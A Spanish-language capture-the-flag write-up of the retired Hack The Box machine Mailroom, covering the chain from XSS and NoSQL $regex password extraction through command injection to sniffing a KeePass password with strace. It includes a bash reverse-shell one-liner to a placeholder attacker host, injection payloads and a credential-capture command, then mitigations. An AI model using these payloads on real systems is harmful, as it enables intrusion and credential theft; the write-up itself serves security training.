---
machine: Mailroom
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, xss, nosql, gitea, command-injection, keepass, ptrace, privesc]
---

# Mailroom — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`mailroom.htb` tiene un formulario de contacto que el administrador revisa, lo que permite un XSS. En `git.mailroom.htb` corre Gitea 1.18.0 con el código de `staffroom`, el sitio privado de `staff-review-panel.mailroom.htb`. El login de `staffroom` es vulnerable a inyección NoSQL; el XSS lanza las peticiones desde el navegador del administrador (XSRF) y exfiltra la contraseña de `tristan` carácter a carácter. Con SSH como `tristan` se enumera el contenedor de `staffroom`, se abre un túnel al panel interno y la command injection de `inspect.php` da `www-data`. La contraseña de `matthew` permite `su`; su base KeePass se abre con `kpcli` y `strace` captura la contraseña maestra, con la que se llega a root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 4ubuntu0.5.
- `80` Apache httpd 2.4.54 (Debian).

```bash
ffuf -u http://mailroom.htb -H "Host: FUZZ.mailroom.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>
```

Aparecen `git.mailroom.htb` y `staff-review-panel.mailroom.htb`.

## Enumeración

Gitea muestra un repositorio público con el código de `staffroom`. En `auth.php` se referencia el dominio del panel interno. El código de `index.php` incluye un formulario de login y una consulta a MongoDB construida con los valores enviados.

El sitio principal tiene un formulario de contacto que envía un correo al administrador; el mensaje se almacena y se muestra en el panel, así que un XSS se ejecuta con su sesión.

## Foothold

El XSS se envía en el campo del mensaje y carga un script que hace peticiones al panel interno desde el navegador del administrador. Como el login es vulnerable a inyección NoSQL, el script prueba expresiones regulares sobre la contraseña y envía cada coincidencia a un servidor propio:

```javascript
fetch('http://staff-review-panel.mailroom.htb/auth.php', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=tristan&password[$regex]=^a'
});
```

Repitiendo la prueba para cada carácter se reconstruye la contraseña de `tristan`, que funciona por SSH:

```bash
ssh tristan@mailroom.htb
```

## Movimiento lateral

`tristan` puede enumerar el contenedor de `staffroom` y su código. Con un túnel SSH se accede al panel interno desde el host:

```bash
ssh -L 8080:staff-review-panel.mailroom.htb:80 tristan@mailroom.htb
```

En el contenedor, `dashboard.php` permite consultar tickets y `inspect.php` recibe `inquiry_id` y lo usa para leer el contenido. El parámetro se concatena en una llamada al sistema, así que un separador ejecuta comandos y da shell como `www-data`:

```text
<ID>; id
<ID>; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

## Escalada de privilegios

La enumeración del contenedor muestra los homes y el correo de `matthew`. Su contraseña se reutiliza y permite `su` en el host. En su home está `personal.kdbx`, una base KeePass que se abre con `kpcli`.

`matthew` introduce la contraseña maestra en `kpcli`; un `strace` adjunto al proceso captura la entrada:

```bash
strace -f -e trace=read,write -p <PID> 2>&1 | grep -i "pass"
```

Con la contraseña capturada se abre la base y se lee la entrada de root, que se usa con `su -` para cerrar la máquina.

## Evidencia

- Repositorio de `staffroom` en Gitea y referencia al panel interno.
- XSS ejecutado con la sesión del administrador.
- Peticiones NoSQL con `$regex` y contraseña de `tristan` reconstruida.
- Túnel SSH al panel y command injection en `inspect.php`.
- `su` como `matthew` y `personal.kdbx`.
- `strace` sobre `kpcli` y contraseña de root.

## Lecciones aprendidas

- Un XSS contra el administrador puede lanzar peticiones autenticadas a un panel interno.
- La inyección NoSQL con operadores permite extraer contraseñas sin fuerza bruta clásica.
- Un repositorio público puede revelar la lógica y los dominios internos.
- Concatenar `inquiry_id` en una llamada al sistema es command injection.
- Un gestor de contraseñas abierto en una sesión observable se puede espiar con `ptrace`.

## Mitigaciones y detección

- Escapar el contenido del formulario y no renderizar HTML del usuario en el panel.
- Parametrizar las consultas NoSQL y rechazar operadores como `$regex` o `$ne`.
- No publicar código con dominios internos en repositorios accesibles.
- Validar `inquiry_id` como entero y usar consultas preparadas.
- Restringir `ptrace` (`kernel.yama.ptrace_scope`) y no abrir gestores de contraseñas en sesiones compartidas.
- Alertar de peticiones con operadores NoSQL y de procesos que leen la entrada de `kpcli`.

## Referencias

- [0xdf — Mailroom](https://0xdf.gitlab.io/2023/08/19/htb-mailroom.html)
- [IppSec — Mailroom](https://www.youtube.com/watch?v=PREVgpmZGuo)
- [Hack The Box — Mailroom](https://app.hackthebox.com/machines/mailroom)
